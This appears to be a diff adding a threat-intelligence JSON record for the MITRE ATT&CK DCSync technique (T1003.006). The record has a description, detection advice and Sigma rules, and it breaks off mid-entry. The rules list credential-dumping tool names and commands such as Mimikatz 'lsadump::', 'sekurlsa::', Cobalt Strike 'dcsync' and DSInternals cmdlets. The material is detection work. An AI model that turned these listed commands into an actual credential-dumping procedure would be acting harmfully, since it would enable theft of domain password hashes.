@@ -1,0 +1,246 @@
+{
+    "id": "T1003.006",
+    "name": "DCSync",
+    "description": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](T1558.001) for use in [Pass the Ticket](T1550.003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](T1098).(Citation: InsiderThreat ChangeNTLM July 2017)\nDCSync functionality has been included in the \"lsadump\" module in [Mimikatz](S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)",
+    "platforms": "Windows",
+    "kill_chain_phases": "Credential Access",
+    "data_sources": "Active Directory: Active Directory Object Access, Network Traffic: Network Traffic Flow, Network Traffic: Network Traffic Content",
+    "detection": "Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Also monitor for network protocols(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests(Citation: Microsoft SAMR) from IPs not associated with known domain controllers.(Citation: AdSecurity DCSync Sept 2015)\nNote: Domain controllers may not log replication requests originating from the default domain controller account.(Citation: Harmj0y DCSync Sept 2015)",
+    "url": "https://attack.mitre.org/techniques/T1003/006",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1003.006",
+                "atomic_attack_guid": "129efd28-8497-4c87-a1b0-73b9a870ca3e",
+                "atomic_attack_name": "DCSync (Active Directory)",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "HackTool - Mimikatz Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml",
+                        "remote_content": "title: HackTool - Mimikatz Execution\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nstatus: test\ndescription: Detection well-known mimikatz command line arguments\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://tools.thehacker.recipes/mimikatz/modules\nauthor: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim Shelton\ndate: 2019-10-22\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.001\n    - attack.t1003.002\n    - attack.t1003.004\n    - attack.t1003.005\n    - attack.t1003.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tools_name:\n        CommandLine|contains:\n            - 'DumpCreds'\n            - 'mimikatz'\n    selection_function_names: # To cover functions from modules that are not in module_names\n        CommandLine|contains:\n            - '::aadcookie' # misc module\n            - '::detours' # misc module\n            - '::memssp' # misc module\n            - '::mflt' # misc module\n            - '::ncroutemon' # misc module\n            - '::ngcsign' # misc module\n            - '::printnightmare' # misc module\n            - '::skeleton' # misc module\n            - '::preshutdown'  # service module\n            - '::mstsc'  # ts module\n            - '::multirdp'  # ts module\n    selection_module_names:\n        CommandLine|contains:\n            - 'rpc::'\n            - 'token::'\n            - 'crypto::'\n            - 'dpapi::'\n            - 'sekurlsa::'\n            - 'kerberos::'\n            - 'lsadump::'\n            - 'privilege::'\n            - 'process::'\n            - 'vault::'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Operator Bloopers Cobalt Strike Commands",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_cobaltstrike_bloopers_cmd.yml",
+                        "remote_content": "title: Operator Bloopers Cobalt Strike Commands\nid: 647c7b9e-d784-4fda-b9a0-45c565a7b729\nrelated:\n    - id: 4f154fb6-27d1-4813-a759-78b93e0b9c48\n      type: similar\nstatus: test\ndescription: Detects use of Cobalt Strike commands accidentally entered in the CMD shell\nreferences:\n    - https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf\n    - https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/\n    - https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\nauthor: _pete_0, TheDFIRReport\ndate: 2022-05-06\nmodified: 2023-01-30\ntags:\n    - attack.execution\n    - attack.t1059.003\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'Cmd.Exe'\n        - Image|endswith: '\\cmd.exe'\n    selection_cli:\n        CommandLine|startswith:\n            - 'cmd '\n            - 'cmd.exe'\n            - 'c:\\windows\\system32\\cmd.exe'\n        CommandLine|contains:\n            - 'psinject'\n            - 'spawnas'\n            - 'make_token'\n            - 'remote-exec'\n            - 'rev2self'\n            - 'dcsync'\n            - 'logonpasswords'\n            - 'execute-assembly'\n            - 'getsystem'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows Mimikatz Binary Execution",
+                        "rule_link": "https://research.splunk.com/endpoint/a9e0d6d3-9676-4e26-994d-4e0406bb4467/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1003.006",
+                "atomic_attack_guid": "a0bced08-3fc5-4d8b-93b7-e8344739376e",
+                "atomic_attack_name": "Run DSInternals Get-ADReplAccount",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "DSInternals Suspicious PowerShell Cmdlets",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_dsinternals_cmdlets.yml",
+                        "remote_content": "title: DSInternals Suspicious PowerShell Cmdlets\nid: 43d91656-a9b2-4541-b7e2-6a9bd3a13f4e\nrelated:\n    - id: 846c7a87-8e14-4569-9d49-ecfd4276a01c\n      type: similar\nstatus: experimental\ndescription: |\n    Detects execution and usage of the DSInternals PowerShell module. Which can be used to perform what might be considered as suspicious activity such as dumping DPAPI backup keys or manipulating NTDS.DIT files.\n    The DSInternals PowerShell Module exposes several internal features of Active Directory and Azure Active Directory. These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups and password hash calculation.\nreferences:\n    - https://github.com/MichaelGrafnetter/DSInternals/blob/39ee8a69bbdc1cfd12c9afdd7513b4788c4895d4/Src/DSInternals.PowerShell/DSInternals.psd1\nauthor: Nasreddine Bencherchali (Nextron Systems), Nounou Mbeiri\ndate: 2024-06-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Add-ADDBSidHistory'\n            - 'Add-ADNgcKey'\n            - 'Add-ADReplNgcKey'\n            - 'ConvertFrom-ADManagedPasswordBlob'\n            - 'ConvertFrom-GPPrefPassword'\n            - 'ConvertFrom-ManagedPasswordBlob'\n            - 'ConvertFrom-UnattendXmlPassword'\n            - 'ConvertFrom-UnicodePassword'\n            - 'ConvertTo-AADHash'\n            - 'ConvertTo-GPPrefPassword'\n            - 'ConvertTo-KerberosKey'\n            - 'ConvertTo-LMHash'\n            - 'ConvertTo-MsoPasswordHash'\n            - 'ConvertTo-NTHash'\n            - 'ConvertTo-OrgIdHash'\n            - 'ConvertTo-UnicodePassword'\n            - 'Disable-ADDBAccount'\n            - 'Enable-ADDBAccount'\n            - 'Get-ADDBAccount'\n            - 'Get-ADDBBackupKey'\n            - 'Get-ADDBDomainController'\n            - 'Get-ADDBGroupManagedServiceAccount'\n            - 'Get-ADDBKdsRootKey'\n            - 'Get-ADDBSchemaAttribute'\n            - 'Get-ADDBServiceAccount'\n            - 'Get-ADDefaultPasswordPolicy'\n            - 'Get-ADKeyCredential' # Covers 'Get-ADKeyCredentialLink'\n            - 'Get-ADPasswordPolicy'\n            - 'Get-ADReplAccount'\n            - 'Get-ADReplBackupKey'\n            - 'Get-ADReplicationAccount'\n            - 'Get-ADSIAccount'\n            - 'Get-AzureADUserEx'\n            - 'Get-BootKey'\n            - 'Get-KeyCredential'\n            - 'Get-LsaBackupKey'\n            - 'Get-LsaPolicy' # Covers 'Get-LsaPolicyInformation'\n            - 'Get-SamPasswordPolicy'\n            - 'Get-SysKey'\n            - 'Get-SystemKey'\n            - 'New-ADDBRestoreFromMediaScript'\n            - 'New-ADKeyCredential' # Covers 'New-ADKeyCredentialLink'\n            - 'New-ADNgcKey'\n            - 'New-NTHashSet'\n            - 'Remove-ADDBObject'\n            - 'Save-DPAPIBlob'\n            - 'Set-ADAccountPasswordHash'\n            - 'Set-ADDBAccountPassword' # Covers 'Set-ADDBAccountPasswordHash'\n            - 'Set-ADDBBootKey'\n            - 'Set-ADDBDomainController'\n            - 'Set-ADDBPrimaryGroup'\n            - 'Set-ADDBSysKey'\n            - 'Set-AzureADUserEx'\n            - 'Set-LsaPolicy' # Covers 'Set-LSAPolicyInformation'\n            - 'Set-SamAccountPasswordHash'\n            - 'Set-WinUserPasswordHash'\n            - 'Test-ADDBPasswordQuality'\n            - 'Test-ADPasswordQuality'\n            - 'Test-ADReplPasswordQuality'\n            - 'Test-PasswordQuality'\n            - 'Unlock-ADDBAccount'\n            - 'Write-ADNgcKey'\n            - 'Write-ADReplNgcKey'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of DSInternals for administration or audit purpose.\nlevel: high\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2",
+                    "611eab06-a145-4dfa-a295-3ccc5c20f59a",
+                    "06d71506-7beb-4f22-8888-e2e5e2ca7fd8",
+                    "f303a39a-6255-4b89-aecc-18c4d8ca7163",
+                    "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
+                    "f0d1feba-4344-4ca9-8121-a6c97bd6df52",
+                    "060c3ef1-fd0a-4091-bf46-e7d625f60b73",
+                    "4976aa50-8f41-45c6-8b15-ab3fc10e79ed",
+                    "a642964e-bead-4bed-8910-1bb4d63e3b4d",
+                    "17d619c1-e020-4347-957e-1d1207455c93"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2",
+                        "lookup_data": {
+                            "description": "Detects well-known credential dumping tools execution via service execution events",
+                            "raw": "author: Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2017/03/05\ndescription: Detects well-known credential dumping tools execution via service execution\n  events\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|contains:\n    - fgexec\n    - dumpsvc\n    - cachedump\n    - mimidrv\n    - gsecdump\n    - servpw\n    - pwdump\nfalsepositives:\n- Legitimate Administrator using credential dumping tool for password recovery\nid: df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2\nlevel: critical\nlogsource:\n  category: driver_load\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\n  type: derived\nstatus: test\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\n- attack.t1569.002\n- attack.s0005\ntitle: Credential Dumping Tools Service Execution\n",
+                            "sigma:id": "df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2",
+                            "title": "Credential Dumping Tools Service Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "611eab06-a145-4dfa-a295-3ccc5c20f59a",
+                        "lookup_data": {
+                            "description": "Detects Mimikatz DC sync security events",
+                            "raw": "author: Benjamin Delpy, Florian Roth (Nextron Systems), Scott Dermott, Sorina Ionescu\ndate: 2018/06/03\ndescription: Detects Mimikatz DC sync security events\ndetection:\n  condition: selection and not 1 of filter*\n  filter1:\n    SubjectDomainName: Window Manager\n  filter2:\n    SubjectUserName|startswith:\n    - NT AUT\n    - MSOL_\n  filter3:\n    SubjectUserName|endswith: $\n  selection:\n    AccessMask: '0x100'\n    EventID: 4662\n    Properties|contains:\n    - Replicating Directory Changes All\n    - 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\n    - 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\n    - 9923a32a-3607-11d2-b9be-0000f87a36b2\n    - 89e95b76-444d-4c62-991a-0facbeda640c\nfalsepositives:\n- Valid DC Sync that is not covered by the filters; please report\n- Local Domain Admin account used for Azure AD Connect\nid: 611eab06-a145-4dfa-a295-3ccc5c20f59a\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/04/26\nreferences:\n- https://twitter.com/gentilkiwi/status/1003236624925413376\n- https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2\n- https://blog.blacklanternsecurity.com/p/detecting-dcsync?s=r\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4662\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.s0002\n- attack.t1003.006\ntitle: Mimikatz DC Sync\n",
+                            "sigma:id": "611eab06-a145-4dfa-a295-3ccc5c20f59a",
+                            "title": "Mimikatz DC Sync",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "06d71506-7beb-4f22-8888-e2e5e2ca7fd8",
+                        "lookup_data": {
+                            "description": "This method detects mimikatz keywords in different Eventlogs (some of them only appear in older Mimikatz version that are however still used by different threat groups)",
+                            "raw": "author: Florian Roth (Nextron Systems), David ANDRE (additional keywords)\ndate: 2017/01/10\ndescription: This method detects mimikatz keywords in different Eventlogs (some of\n  them only appear in older Mimikatz version that are however still used by different\n  threat groups)\ndetection:\n  condition: keywords and not filter\n  filter:\n    EventID: 15\n  keywords:\n  - dpapi::masterkey\n  - eo.oe.kiwi\n  - event::clear\n  - event::drop\n  - gentilkiwi.com\n  - kerberos::golden\n  - kerberos::ptc\n  - kerberos::ptt\n  - kerberos::tgt\n  - Kiwi Legit Printer\n  - 'lsadump::'\n  - mimidrv.sys\n  - \\mimilib.dll\n  - misc::printnightmare\n  - misc::shadowcopies\n  - misc::skeleton\n  - privilege::backup\n  - privilege::debug\n  - privilege::driver\n  - 'sekurlsa::'\nfalsepositives:\n- Naughty administrators\n- AV Signature updates\n- Files with Mimikatz in their filename\nid: 06d71506-7beb-4f22-8888-e2e5e2ca7fd8\nlevel: high\nlogsource:\n  product: windows\nmodified: 2022/01/05\nreferences:\n- https://tools.thehacker.recipes/mimikatz/modules\nstatus: test\ntags:\n- attack.s0002\n- attack.lateral_movement\n- attack.credential_access\n- car.2013-07-001\n- car.2019-04-004\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.001\n- attack.t1003.006\ntitle: Mimikatz Use\n",
+                            "sigma:id": "06d71506-7beb-4f22-8888-e2e5e2ca7fd8",
+                            "title": "Mimikatz Use",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f303a39a-6255-4b89-aecc-18c4d8ca7163",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1003.006",
+                            "mitre-cti:description": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)\n\nDCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)",
+                            "mitre-cti:name": "DCSync",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['ExtraHop', 'Vincent Le Toux'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163', 'type': 'attack-pattern', 'created': '2020-02-11T18:45:34.293Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1003.006', 'url': 'https://attack.mitre.org/techniques/T1003/006'}, {'url': 'https://msdn.microsoft.com/library/cc228086.aspx', 'description': 'Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017.', 'source_name': 'Microsoft DRSR Dec 2017'}, {'url': 'https://msdn.microsoft.com/library/dd207691.aspx', 'description': 'Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017.', 'source_name': 'Microsoft GetNCCChanges'}, {'url': 'https://wiki.samba.org/index.php/DRSUAPI', 'description': 'SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017.', 'source_name': 'Samba DRSUAPI'}, {'url': 'https://source.winehq.org/WineAPI/samlib.html', 'description': 'Wine API. (n.d.). samlib.dll. Retrieved December 4, 2017.', 'source_name': 'Wine API samlib.dll'}, {'url': 'https://adsecurity.org/?p=1729', 'description': 'Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved August 7, 2017.', 'source_name': 'ADSecurity Mimikatz DCSync'}, {'url': 'http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/', 'description': 'Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved August 7, 2017.', 'source_name': 'Harmj0y Mimikatz and DCSync'}, {'url': 'https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM', 'description': 'Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017.', 'source_name': 'InsiderThreat ChangeNTLM July 2017'}, {'url': 'https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump', 'description': 'Deply, B., Le Toux, V. (2016, June 5). module ~ lsadump. Retrieved August 7, 2017.', 'source_name': 'GitHub Mimikatz lsadump Module'}, {'url': 'https://msdn.microsoft.com/library/cc237008.aspx', 'description': 'Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017.', 'source_name': 'Microsoft NRPC Dec 2017'}, {'url': 'https://msdn.microsoft.com/library/cc245496.aspx', 'description': 'Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017.', 'source_name': 'Microsoft SAMR'}, {'url': 'https://adsecurity.org/?p=1729', 'description': 'Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017.', 'source_name': 'AdSecurity DCSync Sept 2015'}, {'url': 'http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/', 'description': 'Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017.', 'source_name': 'Harmj0y DCSync Sept 2015'}], 'modified': '2021-04-22T20:20:14.595Z', 'name': 'DCSync', 'description': 'Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller\\'s application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.\\n\\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account\\'s password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)\\n\\nDCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_detection': 'Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Also monitor for network protocols(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests(Citation: Microsoft SAMR) from IPs not associated with known domain controllers.(Citation: AdSecurity DCSync Sept 2015)\\n\\nNote: Domain controllers may not log replication requests originating from the default domain controller account.(Citation: Harmj0y DCSync Sept 2015)', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Network Traffic: Network Traffic Content', 'Network Traffic: Network Traffic Flow', 'Active Directory: Active Directory Object Access'], 'x_mitre_permissions_required': ['Administrator']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
+                        "lookup_data": {
+                            "description": "UNC3524: Eye Spy on Your Email",
+                            "link": "http://www.botvrij.eu/data/feed-osint/25adc94b-5b29-44fe-a4a8-c89d17ff3566.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1652459344",
+                            "uuid": "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f0d1feba-4344-4ca9-8121-a6c97bd6df52",
+                        "lookup_data": {
+                            "description": "Detects well-known credential dumping tools execution via service execution events",
+                            "raw": "author: Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2017/03/05\ndescription: Detects well-known credential dumping tools execution via service execution\n  events\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    ServiceFileName|contains:\n    - fgexec\n    - dumpsvc\n    - cachedump\n    - mimidrv\n    - gsecdump\n    - servpw\n    - pwdump\nfalsepositives:\n- Legitimate Administrator using credential dumping tool for password recovery\nid: f0d1feba-4344-4ca9-8121-a6c97bd6df52\nlevel: high\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\n  type: derived\nstatus: test\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\n- attack.t1569.002\n- attack.s0005\ntitle: Credential Dumping Tools Service Execution - Security\n",
+                            "sigma:id": "f0d1feba-4344-4ca9-8121-a6c97bd6df52",
+                            "title": "Credential Dumping Tools Service Execution - Security",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "060c3ef1-fd0a-4091-bf46-e7d625f60b73",
+                        "lookup_data": {
+                            "description": "The DSInternals PowerShell Module exposes several internal features of Active Directory and Azure Active Directory.\nThese include FIDO2 and NGC key auditing, offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups and password hash calculation.\n",
+                            "raw": "author: frack113\ndate: 2022/02/06\ndescription: 'The DSInternals PowerShell Module exposes several internal features\n  of Active Directory and Azure Active Directory.\n\n  These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation, password\n  auditing, DC recovery from IFM backups and password hash calculation.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - Get-ADReplAccount\n    - '-All '\n    - '-Server '\nfalsepositives:\n- Legitimate PowerShell scripts\nid: 060c3ef1-fd0a-4091-bf46-e7d625f60b73\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://www.powershellgallery.com/packages/DSInternals\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.006/T1003.006.md#atomic-test-2---run-dsinternals-get-adreplaccount\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.006\ntitle: Suspicious Get-ADReplAccount\n",
+                            "sigma:id": "060c3ef1-fd0a-4091-bf46-e7d625f60b73",
+                            "title": "Suspicious Get-ADReplAccount",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4976aa50-8f41-45c6-8b15-ab3fc10e79ed",
+                        "lookup_data": {
+                            "description": "Detects well-known credential dumping tools execution via service execution events",
+                            "raw": "author: Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2017/03/05\ndescription: Detects well-known credential dumping tools execution via service execution\n  events\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains:\n    - fgexec\n    - dumpsvc\n    - cachedump\n    - mimidrv\n    - gsecdump\n    - servpw\n    - pwdump\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Legitimate Administrator using credential dumping tool for password recovery\nid: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\nlevel: high\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\n- attack.t1569.002\n- attack.s0005\ntitle: Credential Dumping Tools Service Execution - System\n",
+                            "sigma:id": "4976aa50-8f41-45c6-8b15-ab3fc10e79ed",
+                            "title": "Credential Dumping Tools Service Execution - System",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a642964e-bead-4bed-8910-1bb4d63e3b4d",
+                        "lookup_data": {
+                            "description": "Detection well-known mimikatz command line arguments",
+                            "raw": "author: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim\n  Shelton\ndate: 2019/10/22\ndescription: Detection well-known mimikatz command line arguments\ndetection:\n  condition: ( selection_1 or (module_names and mimikatz_separator) or (function_names\n    and mimikatz_separator) ) and not 1 of filter*\n  filter_1:\n    CommandLine|contains: function Convert-GuidToCompressedGuid\n  filter_vscode:\n    CommandLine|contains|all:\n    - '/d /s /c '\n    - 'checkfilenameiocs --ioc-path '\n    ParentImage|endswith: \\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\n  function_names:\n    CommandLine|contains:\n    - aadcookie\n    - detours\n    - memssp\n    - mflt\n    - ncroutemon\n    - ngcsign\n    - printnightmare\n    - skeleton\n    - preshutdown\n    - mstsc\n    - multirdp\n  mimikatz_separator:\n    CommandLine|contains: '::'\n  module_names:\n    CommandLine|contains:\n    - rpc\n    - token\n    - crypto\n    - dpapi\n    - sekurlsa\n    - kerberos\n    - lsadump\n    - privilege\n    - process\n    - vault\n  selection_1:\n    CommandLine|contains:\n    - DumpCreds\n    - invoke-mimikatz\nfalsepositives:\n- Legitimate Administrator using tool for password recovery\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/07\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- https://tools.thehacker.recipes/mimikatz/modules\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\ntitle: Mimikatz Command Line\n",
+                            "sigma:id": "a642964e-bead-4bed-8910-1bb4d63e3b4d",
+                            "title": "Mimikatz Command Line",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "17d619c1-e020-4347-957e-1d1207455c93",
+                        "lookup_data": {
+                            "description": "Detects potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials.",
